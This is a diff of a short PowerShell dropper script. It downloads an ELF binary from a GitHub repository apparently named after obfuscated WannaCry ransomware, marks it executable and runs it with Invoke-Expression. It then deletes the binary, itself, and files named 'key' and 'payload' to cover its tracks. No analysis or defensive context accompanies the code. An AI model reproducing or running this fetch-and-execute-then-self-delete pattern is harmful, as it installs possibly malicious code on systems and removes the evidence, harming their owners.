@@ -1,8 +1,12 @@
-$url = 'https://raw.githubusercontent.com/bookbot2019/WCRY-OBS/main/Book.elf'
+$url = 'https://github.com/bookbot2019/WCRY-OBS/raw/main/Book_Linux.elf'
 wget -Uri $url
 $scriptName = $MyInvocation.MyCommand.Name
-./Book.elf
-Remove-Item "Book.elf"
+$runAsProgram = "chmod +x Book_Linux.elf"
+Invoke-Expression $runAsProgram
+$script = "./Book_Linux.elf"
+Invoke-Expression $script
+
+Remove-Item "Book_Linux.elf"
 Remove-Item $scriptName
 Remove-Item "key"
 Remove-Item "payload"
